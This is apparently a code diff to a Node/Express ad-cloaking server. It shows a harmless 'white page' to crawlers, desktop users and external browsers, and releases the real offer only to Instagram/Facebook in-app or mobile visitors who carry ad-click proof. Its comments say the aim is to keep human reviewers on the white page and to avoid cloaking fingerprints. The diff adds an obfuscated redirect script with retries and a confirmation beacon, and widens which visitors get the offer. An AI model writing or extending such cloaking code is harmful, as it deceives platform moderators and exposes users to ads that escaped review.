@@ -1827,7 +1827,7 @@ app.get('/api/visitors', async (req, res) => {
   else if (filter === 'page_white') where.push("v.stealth_delivery = 'white'");
   else if (filter === 'page_gray') where.push("v.stealth_delivery = 'gray'");
   else if (filter === 'page_offer') where.push("v.stealth_delivery = 'offer'");
-  else if (filter === 'page_redirect') where.push("(v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect')");
+  else if (filter === 'page_redirect') where.push("(v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect' OR v.stealth_delivery = 'soft_redirect_ok')");
 
   const deliveryFilter = (req.query.delivery || '').toString().trim().toLowerCase();
   if (deliveryFilter && ['white', 'gray', 'offer', 'redirect'].includes(deliveryFilter)) {
@@ -1908,7 +1908,7 @@ app.get('/api/export', async (req, res) => {
   else if (filter === 'page_white') { sql += " AND v.stealth_delivery = 'white'"; }
   else if (filter === 'page_gray') { sql += " AND v.stealth_delivery = 'gray'"; }
   else if (filter === 'page_offer') { sql += " AND v.stealth_delivery = 'offer'"; }
-  else if (filter === 'page_redirect') { sql += " AND (v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect')"; }
+  else if (filter === 'page_redirect') { sql += " AND (v.stealth_delivery = 'redirect' OR v.stealth_delivery = 'soft_redirect' OR v.stealth_delivery = 'soft_redirect_ok')"; }
   sql += ' ORDER BY v.created_at DESC';
 
   const visitors = await db.all(sql, params);
@@ -2353,9 +2353,10 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
-  // Sem nomes de crawlers Meta no JS (fingerprint de cloaking). Crawler não executa script;
-  // o servidor em /api/n/ bloqueia bots. Destino nunca vem no HTML inicial.
-  return `<script>(function(){try{if(navigator.webdriver)return;var p=${JSON.stringify(navPath)};fetch(p+(location.search||''),{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(function(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){try{location.replace(d.next)}catch(e){location.href=d.next}}}).catch(function(){})}catch(e){}})();</script>`;
+  const okPath = '/api/n/' + prefix + '/' + code + '/ok';
+  // Script robusto p/ WebView Meta (FB_IAB/Instagram): retry + beacon de confirmação.
+  // Destino NÃO vem no HTML inicial — só no JSON do POST.
+  return `<script>(function(){try{if(navigator.webdriver)return;var q=location.search||'';var p=${JSON.stringify(navPath)}+q;var ok=${JSON.stringify(okPath)}+q;var tries=0;function go(u){try{if(navigator.sendBeacon)navigator.sendBeacon(ok,JSON.stringify({t:Date.now()}));else fetch(ok,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:'{}',keepalive:true}).catch(function(){})}catch(e){}try{location.replace(u)}catch(e2){location.href=u}}function apply(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)go(d.next)}function pull(){tries++;var done=false;var t=setTimeout(function(){if(!done&&tries<4)pull()},2200);fetch(p,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){done=true;clearTimeout(t);return r.ok?r.json():null}).then(apply).catch(function(){done=true;clearTimeout(t);if(tries<4)setTimeout(pull,400)})}if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',pull);else pull()}catch(e){}})();</script>`;
 }
 
 async function getUserPageHtml(pageId, userId) {
@@ -2464,7 +2465,8 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
-    soft_redirect: 'Soft-redirect — oferta externa (sem 302)',
+    soft_redirect: '→ Oferta externa (liberado)',
+    soft_redirect_ok: '→ Oferta externa CONFIRMADA',
     redirect: 'Redirect — URL externa da oferta'
   };
   return map[kind] || kind;
@@ -3679,11 +3681,14 @@ function evaluateLinkVisitStealth(site, ctx) {
     blockReason = 'Tráfego não identificado como vindo do anúncio (sem fbclid ou ref)';
   }
 
-  // Stealth: oferta só no navegador in-app Instagram/Facebook.
-  // Revisores humanos costumam usar Safari/Chrome externo (mesmo com fbclid) — ficam na white.
-  // Leads reais no app Meta têm marcadores FB_IAB / Instagram no User-Agent.
+  // Stealth: prioriza app Instagram/Facebook. Também libera mobile+fbclid+referrer Meta
+  // (cobre WebViews que às vezes omitem FB_IAB). Desktop / sem prova de clique continuam bloqueados.
   if (!blockReason && !metaInApp) {
-    blockReason = 'Navegador externo — oferta liberada só no app Instagram/Facebook';
+    const handheld = metaInApp || deviceType === 'mobile' || deviceType === 'tablet' || !isDesktopUserAgent(userAgent, headers);
+    const strongMobileAd = handheld && hasAdClickProof(site, query) && refFromMeta;
+    if (!strongMobileAd) {
+      blockReason = 'Navegador externo — oferta liberada no app Meta ou mobile com referrer Facebook/Instagram';
+    }
   }
 
   out.blocked = !!blockReason;
@@ -3813,6 +3818,44 @@ const LINK_HEALTH_PROFILES = [
     headers: { 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"iOS"' }
   }
 ];
+
+async function markStealthOfferConfirmed(site, req) {
+  try {
+    const ip = extractClientIp(req);
+    let row = null;
+    if (db.usePg) {
+      row = await db.get(
+        `SELECT id FROM visitors WHERE site_id = ? AND ip = ? AND stealth_delivery IN ('soft_redirect','offer') AND created_at >= NOW() - INTERVAL '10 minutes' ORDER BY id DESC LIMIT 1`,
+        [site.site_id, ip]
+      );
+    } else {
+      row = await db.get(
+        `SELECT id FROM visitors WHERE site_id = ? AND ip = ? AND (stealth_delivery = 'soft_redirect' OR stealth_delivery = 'offer') AND created_at >= datetime('now', '-10 minutes') ORDER BY id DESC LIMIT 1`,
+        [site.site_id, ip]
+      );
+    }
+    if (row && row.id) {
+      await db.run(`UPDATE visitors SET stealth_delivery = 'soft_redirect_ok', was_blocked = 0, block_reason = NULL WHERE id = ?`, [row.id]);
+      return true;
+    }
+  } catch (e) {
+    console.error('[stealth ok]', e.message);
+  }
+  return false;
+}
+
+async function handleStealthOfferOk(req, res) {
+  const prefix = (req.params.prefix || '').toLowerCase().trim();
+  const code = (req.params.code || '').toLowerCase();
+  const ua = req.headers['user-agent'] || '';
+  if (!ua || ua.length < 10) return res.status(204).end();
+  if (isMetaCrawlerUA(ua)) return res.status(204).end();
+  const site = await db.get('SELECT * FROM sites WHERE link_code = ? AND is_active = 1', [code]);
+  if (!site || !isStealthMode(site)) return res.status(204).end();
+  if (!(await validateSiteLinkPrefix(req, site))) return res.status(204).end();
+  await markStealthOfferConfirmed(site, req);
+  return res.status(204).end();
+}
 
 // Navegação pós-ponte Stealth — fallback para HTML em cache; GET já decide no servidor.
 async function handleStealthNavigation(req, res) {
@@ -3973,6 +4016,9 @@ app.get('/', (req, res) => {
 });
 
 // Rota dinâmica por último: /:prefix/:code – prefix no pool (evita padrão único identificável)
+app.post('/api/n/:prefix/:code/ok', (req, res) => {
+  handleStealthOfferOk(req, res).catch(() => res.status(204).end());
+});
 app.post('/api/n/:prefix/:code', (req, res) => {
   handleStealthNavigation(req, res).catch((err) => { console.error(err); res.status(500).json({ error: 'Erro interno' }); });
 });
